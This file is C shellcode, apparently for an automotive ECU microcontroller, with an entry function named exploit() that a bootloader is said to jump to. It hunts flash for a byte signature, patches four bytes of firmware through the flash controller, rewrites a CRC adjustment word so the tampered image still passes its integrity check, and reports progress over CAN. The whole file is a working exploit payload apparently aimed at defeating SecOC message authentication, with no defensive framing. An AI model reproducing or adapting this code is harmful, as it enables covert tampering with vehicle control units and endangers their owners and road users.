/* SecOC flash patcher — egg-hunter shellcode */

/* FCU registers */
#define FACI_FPCKAR  (*(volatile unsigned short *)0xFFA10084)
#define FACI_FSADDR  (*(volatile unsigned int   *)0xFFA10030)
#define FACI_FCMD8   (*(volatile unsigned char  *)0xFFA20000)
#define FACI_FDATA   (*(volatile unsigned short *)0xFFA20000)
#define FACI_FASTAT  (*(volatile unsigned int   *)0xFFA10080)
#define FACI_FAESTAT (*(volatile unsigned char  *)0xFFA10010)
#define FACI_AUX     (*(volatile unsigned short *)0xFFA100E0)
#define FACI_FENTRYR (*(volatile unsigned short *)0xFFA10088)
#define FACI_FREQR   (*(volatile unsigned short *)0xFFA10020)
#define FLWL_REG     (*(volatile unsigned int   *)0xFFF8A430)
#define FLWE_REG     (*(volatile unsigned int   *)0xFFF82410)

#define BLOCK_SIZE     0x8000
#define BLOCK_MASK     (BLOCK_SIZE - 1)
#define PROG_PAGE_SIZE 256
#define SCAN_START     0x18000
#define SCAN_END       0xFFE00
#define SRAM_BUF       ((volatile unsigned char *)0xFEBF2000)
#define PATCH_W0       0x007f5201

#define CRC_RANGE_START 0x18000
#define CRC_ADJ_ADDR    0xFFDEC
#define CRC_ADJ_BLOCK   0xF8000
#define CRC_ADJ_OFFSET  (CRC_ADJ_ADDR - CRC_ADJ_BLOCK)

#define EGG_0 0x88
#define EGG_1 0x00
#define EGG_2 0x01
#define EGG_3 0x52
#define EGG_4 0x00
#define EGG_5 0x0a
#define EGG_6 0xe5
#define EGG_7 0x0d
#define EGG_LEN 8

typedef void (*wdog_fn)(unsigned int);
typedef unsigned int (*enter_fn)(unsigned int);
typedef void (*exit_fn)(unsigned int);

#define BL_STUB_WDOG ((volatile unsigned int *)0xFEBF1188)

/* CAN TX registers — must be #defines so they inline into .text */
#define TMSTS   ((volatile unsigned char *)0xffd202d0)
#define TMID    ((volatile unsigned int  *)0xffd24000)
#define TMDF0   ((volatile unsigned int  *)0xffd2400c)
#define TMDF1   ((volatile unsigned int  *)0xffd24010)
#define TMPTR   ((volatile unsigned int  *)0xffd24004)
#define TMFDCTR ((volatile unsigned int  *)0xffd24008)
#define TMC     ((volatile unsigned char *)0xffd20250)

/* Forward declarations */
static void send(unsigned int w0, unsigned int w1);
static void tag(unsigned char t, unsigned int a, unsigned int v);
static void feed_watchdog(void);
static void check_bl_stubs(void);
static unsigned int crc32_flash_range(unsigned int start, unsigned int end);
static int faci_wait_ready(void);
static void faci_check_clear_errors(void);
static void faci_enter_pe_mode(void);
static void faci_exit_pe_mode(void);
static int faci_unlock(void);
static int faci_erase(unsigned int addr);
static int faci_program_page(unsigned int addr, volatile unsigned char *src);
static int flash_block_rmw(unsigned int block_base);

/* stubs_valid in a known SRAM location (after shellcode + stub table, before SRAM_BUF) */
#define stubs_valid (*(volatile int *)0xFEBF1F00)

/* exploit() MUST be first — BL jumps to offset 0 of the shellcode */
void exploit() {
    asm("di");
    stubs_valid = 0;
    check_bl_stubs();

    unsigned int saved_state = 0;
    if (stubs_valid) {
        saved_state = ((enter_fn)0xFEBF11AC)(0xFFFF);
        ((wdog_fn)0xFEBF1188)(0xFEBF102C);
    }

    tag(0xB0, 0x0000, stubs_valid);
    tag(0xB0, 0x0004, *BL_STUB_WDOG);

    int err;
    unsigned int egg_addr = 0;
    int match_count = 0;

    send(0xDEAD0001, 0xCAFEBABE);
    {
        unsigned int pos;
        for (pos = SCAN_START; pos < SCAN_END - EGG_LEN; pos++) {
            volatile unsigned char *p = (volatile unsigned char *)pos;
            int match = (p[0] == EGG_0 && p[1] == EGG_1 && p[2] == EGG_2 && p[3] == EGG_3 &&
                         p[4] == EGG_4 && p[5] == EGG_5 && p[6] == EGG_6 && p[7] == EGG_7);
            if (match) {
                match_count++;
                egg_addr = pos;
                tag(0xC1, match_count, egg_addr);
            }
        }
        tag(0xC1, 0x00FF, match_count);
    }

    if (match_count != 1) {
        tag(0xEE, 0x0001, match_count);
        goto done;
    }

    send(0xDEAD0002, 0xCAFEBABE);
    {
        unsigned int block_base = egg_addr & ~BLOCK_MASK;
        unsigned int patch_offset = egg_addr - block_base;
        unsigned int i;

        tag(0xC2, 0x0000, block_base);
        tag(0xC2, 0x0004, patch_offset);

        for (i = 0; i < BLOCK_SIZE; i++)
            SRAM_BUF[i] = ((volatile unsigned char *)block_base)[i];

        tag(0xC2, 0x0010, *(unsigned int *)(SRAM_BUF + patch_offset));

        SRAM_BUF[patch_offset + 0] = 0x01;
        SRAM_BUF[patch_offset + 1] = 0x52;
        SRAM_BUF[patch_offset + 2] = 0x7f;
        SRAM_BUF[patch_offset + 3] = 0x00;

        tag(0xC2, 0x0020, *(unsigned int *)(SRAM_BUF + patch_offset));

        send(0xDEAD0003, 0xCAFEBABE);

        err = flash_block_rmw(block_base);
        tag(0xC3, 0x0010, err);
        if (err) { tag(0xEE, 0x0003, 0xDEADDEAD); goto done; }

        tag(0xC3, 0x0020, *(volatile unsigned int *)egg_addr);
        tag(0xC3, 0x00F0, (*(volatile unsigned int *)egg_addr == PATCH_W0) ? 0x600D : 0xBAD0);
    }

    send(0xDEAD0004, 0xCAFEBABE);
    {
        feed_watchdog();

        unsigned int crc_pre_adj = crc32_flash_range(CRC_RANGE_START, CRC_ADJ_ADDR);
        unsigned int new_adj = crc_pre_adj ^ 0xFFFFFFFF;

        tag(0xC4, 0x0000, crc_pre_adj);
        tag(0xC4, 0x0004, new_adj);

        feed_watchdog();

        unsigned int i;
        for (i = 0; i < BLOCK_SIZE; i++)
            SRAM_BUF[i] = ((volatile unsigned char *)CRC_ADJ_BLOCK)[i];

        tag(0xC4, 0x0008, *(unsigned int *)(SRAM_BUF + CRC_ADJ_OFFSET));

        SRAM_BUF[CRC_ADJ_OFFSET + 0] = (new_adj >>  0) & 0xFF;
        SRAM_BUF[CRC_ADJ_OFFSET + 1] = (new_adj >>  8) & 0xFF;
        SRAM_BUF[CRC_ADJ_OFFSET + 2] = (new_adj >> 16) & 0xFF;
        SRAM_BUF[CRC_ADJ_OFFSET + 3] = (new_adj >> 24) & 0xFF;

        err = flash_block_rmw(CRC_ADJ_BLOCK);
        tag(0xC4, 0x0010, err);
        if (err) { tag(0xEE, 0x0005, 0xDEADDEAD); goto done; }

        feed_watchdog();

        unsigned int crc_verify = crc32_flash_range(CRC_RANGE_START, CRC_ADJ_ADDR + 4);
        tag(0xC4, 0x0020, crc_verify);
        tag(0xC4, 0x00F0, (crc_verify == 0xFFFFFFFF) ? 0x600D : 0xBAD0);
    }

    send(0xDEAD0005, 0xCAFEBABE);
    tag(0xC5, 0x0000, egg_addr);
    tag(0xC5, 0x0004, match_count);

done:
    if (stubs_valid) {
        ((wdog_fn)0xFEBF1188)(0);
        ((exit_fn)0xFEBF11D2)(saved_state);
    }
    send(0xDEAD00FF, 0xCAFEBABE);
    while (1) { ; }
}

/* --- Implementation --- */

static void send(unsigned int w0, unsigned int w1) {
    int i = 0x10;
    if ((*(TMSTS + i) & 0b110) != 0) {}
    *(TMPTR   + 8*i) = 0b1000 << 28;
    *(TMID    + 8*i) = 0x7a9;
    *(TMDF0   + 8*i) = w0;
    *(TMDF1   + 8*i) = w1;
    *(TMFDCTR + 8*i) = 0x0;
    *(TMC + i) |= 0x1;
    while ((*(TMSTS + i) & 0b110) == 0) {}
    *(TMSTS + i) = *(TMSTS + i) & 0xf9;
}

static void tag(unsigned char t, unsigned int a, unsigned int v) {
    send((a << 8) | t, v);
}

static void feed_watchdog(void) {
    if (stubs_valid)
        ((wdog_fn)0xFEBF1188)(0);
}

static void check_bl_stubs(void) {
    unsigned int v = *BL_STUB_WDOG;
    if (v != 0xFFFFFFFF && v != 0x00000000)
        stubs_valid = 1;
}

static unsigned int crc32_flash_range(unsigned int start, unsigned int end) {
    unsigned int crc = 0xFFFFFFFF;
    volatile unsigned char *p = (volatile unsigned char *)start;
    volatile unsigned char *e = (volatile unsigned char *)end;
    unsigned int wdog_count = 0;
    while (p < e) {
        unsigned int byte = *p++;
        int j;
        crc ^= byte;
        for (j = 0; j < 8; j++) {
            if (crc & 1)
                crc = (crc >> 1) ^ 0xEDB88320;
            else
                crc >>= 1;
        }
        if (++wdog_count >= 0x10000) {
            feed_watchdog();
            wdog_count = 0;
        }
    }
    return crc ^ 0xFFFFFFFF;
}

static int faci_wait_ready(void) {
    int t = 500000;
    int wdog_count = 0;
    while (t-- > 0) {
        if (FACI_FASTAT & 0x8000) return 0;
        if (++wdog_count >= 50000) {
            feed_watchdog();
            wdog_count = 0;
        }
    }
    return 1;
}

static void faci_check_clear_errors(void) {
    if (FACI_FAESTAT & 0x10) {
        FACI_FCMD8 = 0xB3;
        faci_wait_ready();
    }
}

static void faci_enter_pe_mode(void) {
    FLWL_REG = 1;
    FLWE_REG = 1;
    faci_wait_ready();
    FACI_FREQR = 0x3B00;
    FACI_FENTRYR = 0x5501;
}

static void faci_exit_pe_mode(void) {
    FLWL_REG = 0;
    FLWE_REG = 0;
    (void)FLWL_REG;
    asm(".short 0x001f"); /* syncp */
    FACI_FENTRYR = 0x5500;
    faci_wait_ready();
    FACI_FPCKAR = 0xAA00;
}

static int faci_unlock(void) {
    int retries = 3;
    while (retries-- > 0) {
        if (faci_wait_ready()) continue;
        FACI_FPCKAR = 0xAA01;
        int t = 100000;
        while (t-- > 0) {
            unsigned short v = FACI_FPCKAR;
            asm(".short 0x001f"); /* syncp */
            if (v == 1) return 0;
        }
        feed_watchdog();
    }
    return 1;
}

static int faci_erase(unsigned int addr) {
    FACI_AUX = 1;
    FACI_FSADDR = addr;
    asm(".short 0x001f"); /* syncp */
    FACI_FCMD8 = 0x20;
    FACI_FCMD8 = 0xD0;
    return faci_wait_ready();
}

static int faci_program_page(unsigned int addr, volatile unsigned char *src) {
    int i;
    FACI_FSADDR = addr;
    asm(".short 0x001f"); /* syncp */
    FACI_FCMD8 = 0xE8;
    FACI_FCMD8 = 0x80;

    for (i = 0; i < PROG_PAGE_SIZE; i += 2) {
        unsigned short w = src[i] | (src[i+1] << 8);
        while (FACI_FASTAT & (1 << 21))
            feed_watchdog();
        FACI_FDATA = w;
    }

    FACI_FCMD8 = 0xD0;
    return faci_wait_ready();
}

static int flash_block_rmw(unsigned int block_base) {
    unsigned int addr;
    int err;

    feed_watchdog();

    err = faci_unlock();
    if (err) return err;

    faci_check_clear_errors();
    faci_enter_pe_mode();
    feed_watchdog();

    err = faci_erase(block_base);
    if (err) { faci_exit_pe_mode(); return err; }

    feed_watchdog();

    for (addr = 0; addr < BLOCK_SIZE; addr += PROG_PAGE_SIZE) {
        err = faci_program_page(block_base + addr, SRAM_BUF + addr);
        if (err) { faci_exit_pe_mode(); return err; }
        if ((addr & 0x7FF) == 0)
            feed_watchdog();
    }

    faci_exit_pe_mode();
    return 0;
}
